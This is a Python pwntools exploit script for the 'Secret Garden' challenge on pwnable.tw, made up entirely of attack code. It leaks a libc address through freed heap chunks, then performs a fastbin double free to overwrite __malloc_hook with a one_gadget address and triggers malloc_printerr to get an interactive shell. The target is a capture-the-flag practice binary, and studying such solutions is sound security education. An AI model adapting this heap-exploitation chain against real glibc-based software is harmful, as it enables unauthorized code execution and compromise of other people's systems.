#!/usr/bin/env python3

import pwn

io = pwn.remote('chall.pwnable.tw', 10203)
libc = pwn.ELF('./libc_64.so.6')

def raise_flower(length, name, color):
	io.recvuntil(b'Your choice : ')
	io.sendline(b'1')
	io.recvuntil(b'Length of the name :')
	io.sendline(str(length))
	io.recvuntil(b'The name of flower :')
	io.send(name)
	io.recvuntil(b'The color of the flower :')
	io.sendline(color)
	io.recvuntil(b'Successful !\n')

def visit():
	io.recvuntil(b'Your choice : ')
	io.sendline(b'2')
	return io.recvuntil('â˜†', drop = True)
	

def remove_flower(index):
	io.recvuntil(b'Your choice : ')
	io.sendline(b'3')
	io.recvuntil(b'Which flower do you want to remove from the garden:')
	io.sendline(str(index))

def clean():
	io.recvuntil(b'Your choice : ')
	io.sendline(b'4')
	io.recvuntil(b'Done!')
	

# leak libc address using fastbin
raise_flower(0xb0, b'A', b'0')
raise_flower(0xb0, b'A', b'0')
remove_flower(0)
raise_flower(128, b'\n', b'0')

leak = visit().split(b':')[3][0:6]
libc_leak = pwn.u64(leak.ljust(8, b'\0'))
libc_base = libc_leak - 3947274


# double free fastbin attack
raise_flower(0x68, b'A', b'0')
raise_flower(0x68, b'A', b'0')
raise_flower(0x68, b'A', b'0')
remove_flower(3)
remove_flower(4)
remove_flower(3)

# overwrite malloc_hook with one_gadget
malloc_hook = libc_base + libc.sym[b'__malloc_hook']
one_gadget = libc_base + 0xef6c4
raise_flower(0x68, pwn.p64(malloc_hook - 0x23), b'0')
raise_flower(0x68, b'A', b'0')
raise_flower(0x68, b'A', b'0')

raise_flower(0x68, b'\0' * 0x13 + pwn.p64(one_gadget), b'0')

# trigger malloc_printerr
remove_flower(3)
remove_flower(3)

io.interactive()
